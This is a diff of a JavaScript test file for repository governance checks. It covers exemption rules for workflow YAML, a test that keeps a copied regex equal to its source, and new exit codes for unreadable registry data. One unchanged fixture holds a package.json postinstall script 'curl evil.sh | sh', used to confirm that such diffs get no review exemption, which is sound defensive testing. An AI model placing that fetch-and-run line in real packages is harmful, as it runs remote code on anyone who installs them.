@@ -55,6 +55,7 @@ import {
   auditBody,
 } from '../../../../scripts/check-docs-disposition.js';
 import { MAP_PATH } from '../../../../scripts/check-area-map.js';
+import { WORKFLOW_FILE_RE } from '../../../../scripts/check-doc-closure.js';
 import { AUTOMATED_BRANCH } from '../../../../scripts/check-no-release-outputs.js';
 
 const MAP = {
@@ -612,6 +613,38 @@ describe('isExemptDiff — the declared classes that skip the sections', () => {
       pkgWith({ scripts: { build: 'x', postinstall: 'curl evil.sh | sh' } }),
     );
     assert.equal(isExemptDiff({ files: ['package.json'], fileDiff: () => scripts }), false);
+  });
+
+  it('does not exempt a nested YAML — the workflow boundary is one directory deep', () => {
+    // The pin-bump class is scoped to the files the platform runs as workflows:
+    // tracked YAML DIRECTLY under the workflows directory. A file one level
+    // deeper is not one, so the same pin-shaped diff earns no exemption there.
+    assert.equal(
+      isExemptDiff({
+        files: ['.github/workflows/reusable/build.yml'],
+        fileDiff: () => pinBump,
+      }),
+      false,
+    );
+  });
+
+  it('welds its workflow-file literal to the boundary’s one home', () => {
+    // The literal is a deliberate second copy — importing the boundary would
+    // add a YAML parser, and check-ci-filter.js which brings the same parser,
+    // to the command line that runs on every pull request — so the two are held
+    // equal as TEXT instead. Read from the script's own source, since the check
+    // never imports it.
+    const source = readFileSync(
+      path.resolve(import.meta.dirname, '../../../..', 'scripts/check-docs-disposition.js'),
+      'utf8',
+    );
+    const written = source.match(/if \((\/\^\\\.github[^)]*?\/)\.test\(f\)\)/);
+    assert.ok(written, 'the workflow-file literal moved — re-anchor this weld');
+    assert.equal(
+      written[1].slice(1, -1),
+      WORKFLOW_FILE_RE.source,
+      'the copied literal and the boundary its home states have drifted apart',
+    );
   });
 
   it('does not exempt mixed diffs or empty file lists', () => {
@@ -1350,7 +1383,7 @@ describe('run() governance-data-only class — the recorded line end to end', ()
   });
 });
 
-describe('run() on governance data it cannot use — the red is the refusal, on the ordinary red path', () => {
+describe('run() on governance data it cannot use — the red is the refusal, on each loader’s own exit code', () => {
   // The check reads both governance-data files to derive scope, so either one it
   // cannot use is breakage on its own input, and the red is the verdict itself
   // rather than a crash on the way to it — the same posture the class tests above
@@ -1466,8 +1499,8 @@ describe('run() on governance data it cannot use — the red is the refusal, on 
     );
     assert.equal(
       r.status,
-      1,
-      `expected the unparseable registry to red (exit 1), got exit ${r.status}.\n` +
+      2,
+      `expected the unparseable registry to refuse on the machinery exit code (exit 2), got exit ${r.status}.\n` +
         `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
     );
     assert.match(
@@ -1499,8 +1532,8 @@ describe('run() on governance data it cannot use — the red is the refusal, on 
     );
     assert.equal(
       r.status,
-      1,
-      `expected the unreadable registry to red (exit 1), got exit ${r.status}.\n` +
+      2,
+      `expected the unreadable registry to refuse on the machinery exit code (exit 2), got exit ${r.status}.\n` +
         `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
     );
     assert.match(r.stderr, new RegExp(`${REGISTRY_PATH.replace('.', '\\.')} could not be read`));
